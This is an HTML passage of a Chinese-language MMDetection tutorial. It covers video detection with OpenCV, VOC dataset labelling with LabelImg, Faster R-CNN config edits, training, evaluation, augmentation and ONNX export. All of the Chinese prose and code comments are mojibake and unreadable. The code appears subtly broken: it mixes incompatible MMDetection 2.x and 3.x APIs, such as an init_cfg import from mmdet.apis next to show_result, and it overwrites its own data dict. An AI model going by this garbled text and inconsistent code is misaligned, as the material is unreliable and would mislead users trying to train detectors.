<li><strong>ç±»åˆ«è§£æ</strong>ï¼š<code>model.CLASSES</code> åŒ…å«é¢„è®­ç»ƒæ¨¡å‹æ”¯æŒçš„æ‰€æœ‰ç±»åˆ«ï¼ˆCOCO æ•°æ®é›†ä¸º 80 ç±»ï¼‰ï¼Œå¯ç›´æ¥ç”¨äºè§£ææ£€æµ‹ç»“æœçš„ç±»åˆ«ç´¢å¼•ã€‚</li>
</ol>
<h3 data-id="heading-18">æ‰©å±•ï¼šè§†é¢‘ç›®æ ‡æ£€æµ‹æ¨ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">from</span> mmdet.apis <span class="hljs-keyword">import</span> init_detector, inference_detector

<span class="hljs-comment"># 1. é…ç½®å‚æ•°</span>
config_file = <span class="hljs-string">"faster_rcnn/faster-rcnn_r50_fpn_1x_coco.py"</span>
checkpoint_file = <span class="hljs-literal">None</span>
video_path = <span class="hljs-string">"test_road.mp4"</span>  <span class="hljs-comment"># æµ‹è¯•è§†é¢‘è·¯å¾„</span>
output_video_path = <span class="hljs-string">"mmdet_road_detection.mp4"</span>
device = <span class="hljs-string">"cuda:0"</span> <span class="hljs-keyword">if</span> cv2.cuda.getDeviceCount() &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"cpu"</span>

<span class="hljs-comment"># 2. åˆå§‹åŒ–æ¨¡å‹</span>
model = init_detector(config_file, checkpoint_file, device=device)

<span class="hljs-comment"># 3. æ‰“å¼€è§†é¢‘æ–‡ä»¶</span>
cap = cv2.VideoCapture(video_path)
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cap.isOpened():
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"æ— æ³•æ‰“å¼€è§†é¢‘æ–‡ä»¶ï¼Œè¯·æ£€æŸ¥è·¯å¾„æ˜¯å¦æ­£ç¡®"</span>)

<span class="hljs-comment"># 4. è·å–è§†é¢‘å‚æ•°</span>
fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))
width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">"mp4v"</span>)

<span class="hljs-comment"># 5. åˆå§‹åŒ–è§†é¢‘å†™å…¥å™¨</span>
out = cv2.VideoWriter(output_video_path, fourcc, fps, (width, height))

<span class="hljs-comment"># 6. é€å¸§æ¨ç†å¹¶å†™å…¥ç»“æœ</span>
<span class="hljs-keyword">while</span> cap.isOpened():
    ret, frame = cap.read()
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ret:
        <span class="hljs-keyword">break</span>
    
    <span class="hljs-comment"># æ‰§è¡Œæ¨ç†ï¼ˆå°†è§†é¢‘å¸§è½¬æ¢ä¸º RGB æ ¼å¼ï¼Œé€‚é… MMDetectionï¼‰</span>
    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    result = inference_detector(model, frame_rgb)
    
    <span class="hljs-comment"># ç»˜åˆ¶æ£€æµ‹ç»“æœï¼ˆä½¿ç”¨æ¨¡å‹è‡ªå¸¦ç»˜åˆ¶å‡½æ•°ï¼‰</span>
    frame_result = model.show_result(
        frame,
        result,
        score_thr=<span class="hljs-number">0.5</span>,
        bbox_color=(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>),
        text_color=(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>),
        thickness=<span class="hljs-number">2</span>,
        font_scale=<span class="hljs-number">0.5</span>
    )
    
    <span class="hljs-comment"># å†™å…¥ç»“æœè§†é¢‘</span>
    out.write(frame_result)
    
    <span class="hljs-comment"># å®æ—¶æ˜¾ç¤ºç»“æœï¼ˆæŒ‰ 'q' é€€å‡ºï¼‰</span>
    cv2.imshow(<span class="hljs-string">"MMDetection Video Detection"</span>, frame_result)
    <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">"q"</span>):
        <span class="hljs-keyword">break</span>

<span class="hljs-comment"># 7. é‡Šæ”¾èµ„æº</span>
cap.release()
out.release()
cv2.destroyAllWindows()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"è§†é¢‘æ£€æµ‹å®Œæˆï¼Œç»“æœå·²ä¿å­˜è‡³ <span class="hljs-subst">{output_video_path}</span>"</span>)
</code></pre>
<h2 data-id="heading-19">å››ã€æ ¸å¿ƒå®æˆ˜ï¼šè‡ªå®šä¹‰æ•°æ®é›†è®­ç»ƒï¼ˆè½åœ°æ ¸å¿ƒï¼ŒVOC æ ¼å¼ï¼‰</h2>
<p>ä¼ ç»Ÿç›®æ ‡æ£€æµ‹æ¨¡å‹éœ€è¦å¤§é‡æ ‡æ³¨æ•°æ®å’Œå¤æ‚çš„å·¥ç¨‹å®ç°ï¼Œè€Œ MMDetection å¯åŸºäºè‡ªå®šä¹‰ VOC æ ¼å¼æ•°æ®é›†å¿«é€Ÿå®ç°æ¨¡å‹è®­ç»ƒï¼Œæ ¸å¿ƒæµç¨‹ä¸ºã€Œ<strong>æ•°æ®é›†å‡†å¤‡ä¸æ ‡æ³¨â†’é…ç½®æ–‡ä»¶ä¿®æ”¹â†’æ‰§è¡Œè®­ç»ƒâ†’æ¨¡å‹éªŒè¯â†’æ¨ç†æµ‹è¯•</strong>ã€ã€‚</p>
<h3 data-id="heading-20">æ­¥éª¤ 1ï¼šæ•°æ®é›†å‡†å¤‡ä¸æ ‡æ³¨ï¼ˆVOC æ ¼å¼ï¼‰</h3>
<h4 data-id="heading-21">1. VOC æ•°æ®é›†ç›®å½•ç»“æ„</h4>
<p>é¦–å…ˆåˆ›å»ºç¬¦åˆ VOC æ ¼å¼çš„æ•°æ®é›†ç›®å½•ï¼Œç»“æ„å¦‚ä¸‹ï¼ˆä»¥ã€ŒçŒ«ç‹—åˆ†ç±»æ£€æµ‹ã€ä¸ºä¾‹ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">custom_cat_dog_dataset/
â”œâ”€â”€ Annotations/  <span class="hljs-comment"># æ ‡æ³¨æ–‡ä»¶ç›®å½•ï¼ˆ*.xmlï¼Œæ¯å¼ å›¾ç‰‡å¯¹åº”ä¸€ä¸ª xml æ–‡ä»¶ï¼‰</span>
â”œâ”€â”€ Images/       <span class="hljs-comment"># å›¾åƒæ–‡ä»¶ç›®å½•ï¼ˆ*.jpg / *.pngï¼Œè®­ç»ƒ/éªŒè¯å›¾åƒæ”¾åœ¨ä¸€èµ·ï¼‰</span>
â”œâ”€â”€ ImageSets/
â”‚   â””â”€â”€ Main/
â”‚       â”œâ”€â”€ train.txt  <span class="hljs-comment"># è®­ç»ƒé›†å›¾åƒåç§°åˆ—è¡¨ï¼ˆæ— åç¼€ï¼Œå¦‚ "cat_001"ï¼‰</span>
â”‚       â”œâ”€â”€ val.txt    <span class="hljs-comment"># éªŒè¯é›†å›¾åƒåç§°åˆ—è¡¨ï¼ˆæ— åç¼€ï¼Œå¦‚ "dog_001"ï¼‰</span>
â”‚       â””â”€â”€ test.txt   <span class="hljs-comment"># æµ‹è¯•é›†å›¾åƒåç§°åˆ—è¡¨ï¼ˆå¯é€‰ï¼‰</span>
</code></pre>
<h4 data-id="heading-22">2. å›¾åƒæ ‡æ³¨ï¼ˆLabelImg å·¥å…·ï¼‰</h4>
<p>ä½¿ç”¨ <code>LabelImg</code> å·¥å…·è¿›è¡Œå›¾åƒæ ‡æ³¨ï¼Œç”Ÿæˆ VOC æ ¼å¼çš„ <code>*.xml</code> æ ‡æ³¨æ–‡ä»¶ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>å®‰è£… LabelImgï¼š<code>pip install labelImg -i https://pypi.tuna.tsinghua.edu.cn/simple</code>ï¼›</li>
<li>å¯åŠ¨ LabelImgï¼šåœ¨ç»ˆç«¯è¾“å…¥ <code>labelImg</code>ï¼Œé€‰æ‹©æ•°æ®é›†çš„ <code>Images</code> ç›®å½•å’Œ <code>Annotations</code> ç›®å½•ï¼›</li>
<li>å¼€å§‹æ ‡æ³¨ï¼šç‚¹å‡»ã€ŒCreate RectBoxã€ç»˜åˆ¶æ£€æµ‹æ¡†ï¼Œé€‰æ‹©å¯¹åº”ç±»åˆ«ï¼ˆå¦‚ "cat"ã€"dog"ï¼‰ï¼Œä¿å­˜åè‡ªåŠ¨ç”Ÿæˆ <code>*.xml</code> æ ‡æ³¨æ–‡ä»¶ï¼›</li>
<li>åˆ’åˆ†è®­ç»ƒ/éªŒè¯é›†ï¼šæ‰‹åŠ¨åˆ›å»º <code>train.txt</code> å’Œ <code>val.txt</code>ï¼Œå†™å…¥å›¾åƒåç§°ï¼ˆæ— åç¼€ï¼‰ï¼Œå»ºè®®æŒ‰ 8:2 æ¯”ä¾‹åˆ’åˆ†ã€‚</li>
</ol>
<h3 data-id="heading-23">æ­¥éª¤ 2ï¼šä¿®æ”¹ MMDetection é…ç½®æ–‡ä»¶</h3>
<p>åŸºäºå®˜æ–¹é»˜è®¤é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ä¸ºé€‚é…è‡ªå®šä¹‰ VOC æ•°æ®é›†çš„é…ç½®ï¼Œæ ¸å¿ƒä¿®æ”¹å†…å®¹åŒ…æ‹¬ã€Œ<strong>æ•°æ®é›†è·¯å¾„â†’ç±»åˆ«æ•°ä¸ç±»åˆ«åç§°â†’è®­ç»ƒå‚æ•°â†’é¢„è®­ç»ƒæƒé‡</strong>ã€ã€‚</p>
<h4 data-id="heading-24">1. å¤åˆ¶é»˜è®¤é…ç½®æ–‡ä»¶</h4>
<p>ä» <code>mmdet/configs/pascal_voc/</code> ç›®å½•ä¸‹å¤åˆ¶ <code>faster_rcnn_r50_fpn_1x_voc0712.py</code> é…ç½®æ–‡ä»¶ï¼Œé‡å‘½åä¸º <code>faster_rcnn_r50_fpn_1x_custom_cat_dog.py</code>ï¼Œæ”¾å…¥åŒä¸€ç›®å½•ä¸‹ï¼Œé¿å…ä¿®æ”¹å®˜æ–¹é»˜è®¤é…ç½®ã€‚</p>
<h4 data-id="heading-25">2. æ ¸å¿ƒé…ç½®ä¿®æ”¹ï¼ˆå…³é”®æ­¥éª¤ï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. æ•°æ®é›†è·¯å¾„ä¿®æ”¹ï¼ˆæŒ‡å‘ä½ çš„è‡ªå®šä¹‰ VOC æ•°æ®é›†ç›®å½•ï¼‰</span>
data_root = <span class="hljs-string">"custom_cat_dog_dataset/"</span>  <span class="hljs-comment"># è‡ªå®šä¹‰æ•°æ®é›†æ ¹ç›®å½•</span>
data = <span class="hljs-built_in">dict</span>(
    train=<span class="hljs-built_in">dict</span>(
        ann_file=data_root + <span class="hljs-string">"ImageSets/Main/train.txt"</span>,
        img_prefix=data_root + <span class="hljs-string">"Images/"</span>,
        ann_prefix=data_root + <span class="hljs-string">"Annotations/"</span>,
        classes=(<span class="hljs-string">"cat"</span>, <span class="hljs-string">"dog"</span>),  <span class="hljs-comment"># è‡ªå®šä¹‰ç±»åˆ«åç§°ï¼ˆä¸æ ‡æ³¨ä¸€è‡´ï¼‰</span>
    ),
    val=<span class="hljs-built_in">dict</span>(
        ann_file=data_root + <span class="hljs-string">"ImageSets/Main/val.txt"</span>,
        img_prefix=data_root + <span class="hljs-string">"Images/"</span>,
        ann_prefix=data_root + <span class="hljs-string">"Annotations/"</span>,
        classes=(<span class="hljs-string">"cat"</span>, <span class="hljs-string">"dog"</span>),
    ),
    test=<span class="hljs-built_in">dict</span>(
        ann_file=data_root + <span class="hljs-string">"ImageSets/Main/test.txt"</span>,
        img_prefix=data_root + <span class="hljs-string">"Images/"</span>,
        ann_prefix=data_root + <span class="hljs-string">"Annotations/"</span>,
        classes=(<span class="hljs-string">"cat"</span>, <span class="hljs-string">"dog"</span>),
    ),
)

<span class="hljs-comment"># 2. æ¨¡å‹å¤´éƒ¨ä¿®æ”¹ï¼ˆç±»åˆ«æ•°ä¸è‡ªå®šä¹‰ç±»åˆ«ä¸€è‡´ï¼ŒVOC æ ¼å¼é»˜è®¤ +1 èƒŒæ™¯ç±»ï¼‰</span>
model = <span class="hljs-built_in">dict</span>(
    roi_head=<span class="hljs-built_in">dict</span>(
        bbox_head=<span class="hljs-built_in">dict</span>(
            num_classes=<span class="hljs-number">2</span>,  <span class="hljs-comment"># è‡ªå®šä¹‰ç±»åˆ«æ•°ï¼ˆcat + dog = 2ï¼Œæ— éœ€ +1 èƒŒæ™¯ç±»ï¼ŒMMDetection è‡ªåŠ¨å¤„ç†ï¼‰</span>
        )
    )
)

<span class="hljs-comment"># 3. è®­ç»ƒå‚æ•°ä¿®æ”¹ï¼ˆé€‚é…å°å‹æ•°æ®é›†ï¼Œé¿å…è¿‡æ‹Ÿåˆï¼‰</span>
train_cfg = <span class="hljs-built_in">dict</span>(
    max_epochs=<span class="hljs-number">30</span>,  <span class="hljs-comment"># è®­ç»ƒè½®æ•°ï¼ˆå°å‹æ•°æ®é›† 30-50 å³å¯ï¼‰</span>
    val_interval=<span class="hljs-number">5</span>,  <span class="hljs-comment"># æ¯ 5 è½®éªŒè¯ä¸€æ¬¡</span>
)
optimizer = <span class="hljs-built_in">dict</span>(
    lr=<span class="hljs-number">0.001</span>,  <span class="hljs-comment"># å­¦ä¹ ç‡ï¼ˆæ¯”å®˜æ–¹é»˜è®¤ç•¥ä½ï¼Œé¿å…éœ‡è¡ï¼‰</span>
)
data = <span class="hljs-built_in">dict</span>(
    samples_per_gpu=<span class="hljs-number">4</span>,  <span class="hljs-comment"># æ¯ GPU æ‰¹é‡å¤§å°ï¼ˆæ ¹æ®æ˜¾å­˜è°ƒæ•´ï¼Œæ˜¾å­˜ä¸è¶³è®¾ä¸º 2 æˆ– 1ï¼‰</span>
    workers_per_gpu=<span class="hljs-number">2</span>,  <span class="hljs-comment"># æ¯ GPU æ•°æ®åŠ è½½çº¿ç¨‹æ•°</span>
)

<span class="hljs-comment"># 4. é¢„è®­ç»ƒæƒé‡ä¿®æ”¹ï¼ˆä½¿ç”¨ COCO é¢„è®­ç»ƒæƒé‡ï¼Œè¿ç§»å­¦ä¹ ï¼‰</span>
load_from = <span class="hljs-string">"https://download.openmmlab.com/mmdetection/v2.0/faster_rcnn/faster_rcnn_r50_fpn_1x_coco/faster_rcnn_r50_fpn_1x_coco_20200130-047c8118.pth"</span>  <span class="hljs-comment"># å®˜æ–¹ COCO é¢„è®­ç»ƒæƒé‡</span>
</code></pre>
<h3 data-id="heading-26">æ­¥éª¤ 3ï¼šæ‰§è¡Œæ¨¡å‹è®­ç»ƒï¼ˆä¸¤ç§æ–¹å¼ï¼‰</h3>
<h4 data-id="heading-27">æ–¹å¼ 1ï¼šå‘½ä»¤è¡Œè®­ç»ƒï¼ˆæ¨èï¼Œç®€å•é«˜æ•ˆï¼‰</h4>
<p>åœ¨ç»ˆç«¯æ¿€æ´» <code>mmdet_env</code> è™šæ‹Ÿç¯å¢ƒï¼Œè¿›å…¥ MMDetection æ ¹ç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python tools/train.py \
    configs/pascal_voc/faster_rcnn_r50_fpn_1x_custom_cat_dog.py \
    --work-dir work_dirs/custom_cat_dog \
    --gpu-id 0 \
    --seed 42
</code></pre>
<ul>
<li><code>--work-dir</code>ï¼šè®­ç»ƒç»“æœä¿å­˜ç›®å½•ï¼ˆåŒ…å« checkpointã€æ—¥å¿—ã€é…ç½®æ–‡ä»¶ï¼‰ï¼›</li>
<li><code>--gpu-id</code>ï¼šæŒ‡å®šä½¿ç”¨çš„ GPU ç¼–å·ï¼›</li>
<li><code>--seed</code>ï¼šéšæœºç§å­ï¼Œä¿è¯è®­ç»ƒå¯å¤ç°ã€‚</li>
</ul>
<h4 data-id="heading-28">æ–¹å¼ 2ï¼šPython è„šæœ¬è®­ç»ƒï¼ˆçµæ´»ï¼Œä¾¿äºäºŒæ¬¡å¼€å‘ï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> mmengine.runner <span class="hljs-keyword">import</span> Runner
<span class="hljs-keyword">from</span> mmdet.utils <span class="hljs-keyword">import</span> register_all_modules
<span class="hljs-keyword">from</span> mmdet.apis <span class="hljs-keyword">import</span> init_cfg

<span class="hljs-comment"># 1. æ³¨å†Œæ‰€æœ‰ MMDetection æ¨¡å—</span>
register_all_modules()

<span class="hljs-comment"># 2. åˆå§‹åŒ–é…ç½®</span>
cfg = init_cfg(
    config_file=<span class="hljs-string">"configs/pascal_voc/faster_rcnn_r50_fpn_1x_custom_cat_dog.py"</span>,
    work_dir=<span class="hljs-string">"work_dirs/custom_cat_dog"</span>,
    gpu_id=<span class="hljs-number">0</span>,
)

<span class="hljs-comment"># 3. åˆå§‹åŒ– Runner å¹¶æ‰§è¡Œè®­ç»ƒ</span>
runner = Runner.from_cfg(cfg)
runner.train()
</code></pre>
<h3 data-id="heading-29">æ­¥éª¤ 4ï¼šæ¨¡å‹éªŒè¯ä¸æ¨ç†æµ‹è¯•</h3>
<h4 data-id="heading-30">1. æ¨¡å‹éªŒè¯ï¼ˆè¯„ä¼°ç²¾åº¦ï¼‰</h4>
<p>è®­ç»ƒå®Œæˆåï¼Œä½¿ç”¨éªŒè¯é›†è¯„ä¼°æ¨¡å‹ç²¾åº¦ï¼ˆmAP æŒ‡æ ‡ï¼‰ï¼Œå‘½ä»¤è¡Œæ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python tools/test.py \
    configs/pascal_voc/faster_rcnn_r50_fpn_1x_custom_cat_dog.py \
    work_dirs/custom_cat_dog/epoch_30.pth \
    --<span class="hljs-built_in">eval</span> mAP \
    --gpu-id 0
</code></pre>
<h4 data-id="heading-31">2. è‡ªå®šä¹‰æ¨¡å‹æ¨ç†æµ‹è¯•</h4>
<p>ä½¿ç”¨è®­ç»ƒå®Œæˆçš„æ¨¡å‹æƒé‡ï¼Œæ‰§è¡Œæ¨ç†æµ‹è¯•ï¼Œä»£ç ä¸å¿«é€Ÿå…¥é—¨éƒ¨åˆ†ç±»ä¼¼ï¼Œä»…éœ€ä¿®æ”¹é…ç½®æ–‡ä»¶å’Œæƒé‡è·¯å¾„ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> mmdet.apis <span class="hljs-keyword">import</span> init_detector, inference_detector, show_result_pyplot

<span class="hljs-comment"># 1. é…ç½®å‚æ•°</span>
config_file = <span class="hljs-string">"configs/pascal_voc/faster_rcnn_r50_fpn_1x_custom_cat_dog.py"</span>
checkpoint_file = <span class="hljs-string">"work_dirs/custom_cat_dog/epoch_30.pth"</span>  <span class="hljs-comment"># è®­ç»ƒå®Œæˆçš„æƒé‡</span>
img_path = <span class="hljs-string">"custom_cat_dog_dataset/Images/cat_001.jpg"</span>

<span class="hljs-comment"># 2. åˆå§‹åŒ–æ¨¡å‹</span>
model = init_detector(config_file, checkpoint_file, device=<span class="hljs-string">"cuda:0"</span>)

<span class="hljs-comment"># 3. æ‰§è¡Œæ¨ç†</span>
result = inference_detector(model, img_path)

<span class="hljs-comment"># 4. å¯è§†åŒ–ç»“æœ</span>
show_result_pyplot(
    model,
    img_path,
    result,
    score_thr=<span class="hljs-number">0.5</span>,
    out_file=<span class="hljs-string">"custom_cat_dog_inference_result.jpg"</span>
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"è‡ªå®šä¹‰æ¨¡å‹æ¨ç†å®Œæˆï¼Œç»“æœå·²ä¿å­˜"</span>)
</code></pre>
<h2 data-id="heading-32">äº”ã€è¿›é˜¶ä¼˜åŒ–ï¼šæå‡æ¨¡å‹ç²¾åº¦ä¸è®­ç»ƒæ•ˆç‡</h2>
<h3 data-id="heading-33">1. æ•°æ®å¢å¼ºï¼ˆå‡å°‘è¿‡æ‹Ÿåˆï¼Œæå‡æ³›åŒ–èƒ½åŠ›ï¼‰</h3>
<p>MMDetection å†…ç½®ä¸°å¯Œçš„æ•°æ®å¢å¼ºç­–ç•¥ï¼Œå¯åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ <code>train_pipeline</code> å®ç°ï¼Œå¸¸ç”¨å¢å¼ºç­–ç•¥åŒ…æ‹¬ï¼š</p>
<pre><code class="hljs language-python" lang="python">data = <span class="hljs-built_in">dict</span>(
    train=<span class="hljs-built_in">dict</span>(
        pipeline=[
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'LoadImageFromFile'</span>),
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'LoadAnnotations'</span>, with_bbox=<span class="hljs-literal">True</span>),
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'RandomFlip'</span>, prob=<span class="hljs-number">0.5</span>),  <span class="hljs-comment"># éšæœºæ°´å¹³ç¿»è½¬</span>
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'RandomResize'</span>, scale=(<span class="hljs-number">1333</span>, <span class="hljs-number">800</span>), keep_ratio=<span class="hljs-literal">True</span>),  <span class="hljs-comment"># éšæœºç¼©æ”¾</span>
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'RandomCrop'</span>, crop_size=(<span class="hljs-number">768</span>, <span class="hljs-number">768</span>), crop_ratio=(<span class="hljs-number">0.5</span>, <span class="hljs-number">1.0</span>)),  <span class="hljs-comment"># éšæœºè£å‰ª</span>
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'BrightnessTransform'</span>, brightness_range=(<span class="hljs-number">0.8</span>, <span class="hljs-number">1.2</span>)),  <span class="hljs-comment"># äº®åº¦è°ƒæ•´</span>
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'ContrastTransform'</span>, contrast_range=(<span class="hljs-number">0.8</span>, <span class="hljs-number">1.2</span>)),  <span class="hljs-comment"># å¯¹æ¯”åº¦è°ƒæ•´</span>
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'Normalize'</span>, mean=[<span class="hljs-number">123.675</span>, <span class="hljs-number">116.28</span>, <span class="hljs-number">103.53</span>], std=[<span class="hljs-number">58.395</span>, <span class="hljs-number">57.12</span>, <span class="hljs-number">57.375</span>], to_rgb=<span class="hljs-literal">True</span>),
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'Pad'</span>, size_divisor=<span class="hljs-number">32</span>),
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'DefaultFormatBundle'</span>),
            <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">type</span>=<span class="hljs-string">'Collect'</span>, keys=[<span class="hljs-string">'img'</span>, <span class="hljs-string">'gt_bboxes'</span>, <span class="hljs-string">'gt_labels'</span>]),
        ]
    )
)
</code></pre>
<h3 data-id="heading-34">2. æ¨¡å‹å¾®è°ƒä¸è¿ç§»å­¦ä¹ ï¼ˆæå‡å°å‹æ•°æ®é›†ç²¾åº¦ï¼‰</h3>
<ul>
<li>ä¼˜å…ˆä½¿ç”¨ COCO æ•°æ®é›†é¢„è®­ç»ƒæƒé‡ï¼ˆ<code>load_from</code> å‚æ•°ï¼‰ï¼Œé¿å…ä»å¤´è®­ç»ƒï¼Œå¤§å¹…æå‡è®­ç»ƒæ•ˆç‡å’Œç²¾åº¦ï¼›</li>
<li>å†»ç»“éª¨å¹²ç½‘ç»œï¼ˆå¦‚ ResNet50ï¼‰å‰å‡ å±‚å‚æ•°ï¼Œä»…è®­ç»ƒå¤´éƒ¨ç½‘ç»œï¼Œå‡å°‘è¿‡æ‹Ÿåˆï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼š
<pre><code class="hljs language-python" lang="python">optimizer = <span class="hljs-built_in">dict</span>(
    paramwise_cfg=<span class="hljs-built_in">dict</span>(
        custom_keys=<span class="hljs-built_in">dict</span>(
            backbone=<span class="hljs-built_in">dict</span>(lr_mult=<span class="hljs-number">0.1</span>),  <span class="hljs-comment"># éª¨å¹²ç½‘ç»œå­¦ä¹ ç‡ä¸ºåŸºç¡€å­¦ä¹ ç‡çš„ 0.1 å€</span>
        )
    )
)
</code></pre>
</li>
</ul>
<h3 data-id="heading-35">3. å­¦ä¹ ç‡è°ƒåº¦ç­–ç•¥ä¼˜åŒ–ï¼ˆé¿å…è®­ç»ƒéœ‡è¡ï¼‰</h3>
<p>ä½¿ç”¨ä½™å¼¦é€€ç«å­¦ä¹ ç‡è°ƒåº¦ç­–ç•¥ï¼Œæ›¿ä»£é»˜è®¤çš„é˜¶æ¢¯å¼å­¦ä¹ ç‡ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼š</p>
<pre><code class="hljs language-python" lang="python">param_scheduler = [
    <span class="hljs-built_in">dict</span>(
        <span class="hljs-built_in">type</span>=<span class="hljs-string">'CosineAnnealingLR'</span>,
        T_max=<span class="hljs-number">30</span>,
        eta_min=<span class="hljs-number">1e-5</span>,
        by_epoch=<span class="hljs-literal">True</span>,
        begin=<span class="hljs-number">0</span>,
        end=<span class="hljs-number">30</span>,
    )
]
</code></pre>
<h3 data-id="heading-36">4. æ¨¡å‹é‡åŒ–ä¸éƒ¨ç½²ï¼ˆæå‡æ¨ç†é€Ÿåº¦ï¼Œé€‚é…è¾¹ç¼˜è®¾å¤‡ï¼‰</h3>
<p>è®­ç»ƒå®Œæˆçš„æ¨¡å‹å¯é€šè¿‡ MMCV æä¾›çš„å·¥å…·è½¬æ¢ä¸º ONNX æ ¼å¼ï¼Œé€‚é…è¾¹ç¼˜è®¾å¤‡éƒ¨ç½²ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python tools/export_onnx.py \
    configs/pascal_voc/faster_rcnn_r50_fpn_1x_custom_cat_dog.py \
    work_dirs/custom_cat_dog/epoch_30.pth \
    --output-file faster_rcnn_cat_dog.onnx \
    --input-size 1333 800 \
    --opset-version 11
</code></pre>
<h2 data-id="heading-37">å…­ã€å¸¸è§é—®é¢˜ä¸é¿å‘æŒ‡å—ï¼ˆMMDetection è½åœ°ä¸“å±ï¼‰</h2>
<ol>
<li><strong>é…ç½®æ–‡ä»¶æŠ¥é”™ï¼ˆKeyError / ModuleNotFoundErrorï¼‰</strong>ï¼š
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šæ£€æŸ¥é…ç½®æ–‡ä»¶çš„ç»§æ‰¿å…³ç³»å’Œå‚æ•°æ‹¼å†™ï¼Œç¡®ä¿ MMCVã€MMDetection ç‰ˆæœ¬åŒ¹é…ï¼Œé‡æ–°å®‰è£…å¯¹åº”ç‰ˆæœ¬ï¼›</li>
</ul>
</li>
<li><strong>æ˜¾å­˜ä¸è¶³ï¼ˆCUDA out of memoryï¼‰</strong>ï¼š
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šé™ä½ <code>samples_per_gpu</code>ï¼ˆæ‰¹é‡å¤§å°ï¼‰ã€å‡å°è¾“å…¥å›¾åƒå°ºå¯¸ã€ä½¿ç”¨æ›´å°æ¨¡å‹ï¼ˆå¦‚ R18 éª¨å¹²ç½‘ç»œï¼‰ã€å¯ç”¨åŠç²¾åº¦è®­ç»ƒï¼›</li>
</ul>
</li>
<li><strong>è®­ç»ƒä¸æ”¶æ•›ï¼ˆmAP æ¥è¿‘ 0ï¼‰</strong>ï¼š
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šæ£€æŸ¥æ•°æ®é›†æ ‡æ³¨æ ¼å¼æ˜¯å¦æ­£ç¡®ã€ç±»åˆ«æ•°æ˜¯å¦åŒ¹é…ã€é¢„è®­ç»ƒæƒé‡æ˜¯å¦åŠ è½½æˆåŠŸã€å­¦ä¹ ç‡æ˜¯å¦è¿‡é«˜ï¼›</li>
</ul>
</li>
<li><strong>æ¨ç†ç»“æœä¸ºç©ºï¼ˆæ— æ£€æµ‹æ¡†ï¼‰</strong>ï¼š
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šé™ä½ç½®ä¿¡åº¦é˜ˆå€¼ï¼ˆ<code>score_thr</code>ï¼‰ã€æ£€æŸ¥æ¨¡å‹æƒé‡æ˜¯å¦å¯¹åº”è‡ªå®šä¹‰æ•°æ®é›†ã€å›¾åƒé¢„å¤„ç†æ˜¯å¦ç¬¦åˆæ¨¡å‹è¦æ±‚ï¼›</li>
</ul>
</li>
<li><strong>LabelImg æ ‡æ³¨æ–‡ä»¶æ— æ³•è¯†åˆ«</strong>ï¼š
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šç¡®ä¿æ ‡æ³¨æ–‡ä»¶çš„ç±»åˆ«åç§°ä¸é…ç½®æ–‡ä»¶ä¸€è‡´ã€å›¾åƒåç§°ä¸æ ‡æ³¨æ–‡ä»¶åç§°ä¸€è‡´ã€æ— ä¸­æ–‡è·¯å¾„å’Œç‰¹æ®Šå­—ç¬¦ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-38">ä¸ƒã€è¿›é˜¶æ‰©å±•æ–¹å‘ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜è½åœ°ï¼‰</h2>
